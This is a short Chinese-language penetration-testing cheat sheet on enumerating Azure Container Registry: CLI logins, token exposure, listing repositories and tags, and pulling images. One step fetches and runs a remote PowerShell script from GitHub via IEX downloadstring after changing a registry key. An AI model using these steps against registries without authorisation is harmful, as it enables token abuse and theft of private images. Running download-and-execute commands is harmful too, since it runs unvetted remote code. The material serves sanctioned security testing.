# Azure 服务 - 容器注册表 (Container Registry)

## 枚举 (Enumerate)

使用 Azure CLI 列出订阅中的容器注册表

```ps1
az login -u user@domain.onmicrosoft.com -p pass
az acr list -o table
```

登录到注册表 (Registry)

```ps1
acr=<ACRName> # 来自上一步命令
server=$(az acr login -n $acr --expose-token --query loginServer -o tsv) 
token=$(az acr login -n $acr --expose-token --query accessToken -o tsv) 
docker login $server -u 00000000-0000-0000-0000-000000000000 -p $token 
```

列出 ACR 中的镜像

```ps1
az acr repository list -n $acr 
```

列出镜像的版本标签 (Tags)

```ps1
az acr repository show-tags -n $acr --repository mywebapp
```

在 PowerShell 控制台中连接到容器注册表，设置 `$server` 和 `$token` 变量，并从注册表中拉取镜像

```ps1
# docker login ${registryURI} --username ${username} --password ${password}
$token="<AccessToken>"
$server="<LoginServer>"
docker login $server -u 00000000-0000-0000-0000-000000000000 -p $token
docker pull $server/mywebapp:v1
```

列出注册表内的 docker 容器

```ps1
IEX (New-Object Net.WebClient).downloadstring("https://raw.githubusercontent.com/NetSPI/MicroBurst/master/Misc/Get-AzACR.ps1")
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer\Main" -Name "DisableFirstRunCustomize" -Value 2
Get-AzACR -username ${username} -password ${password} -registry ${registryURI}
```

## 参考资料 (References)

* [PENTESTING AZURE: RECON TECHNIQUES - April 29, 2022 Stefan Tita](https://securitycafe.ro/2022/04/29/pentesting-azure-recon-techniques/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
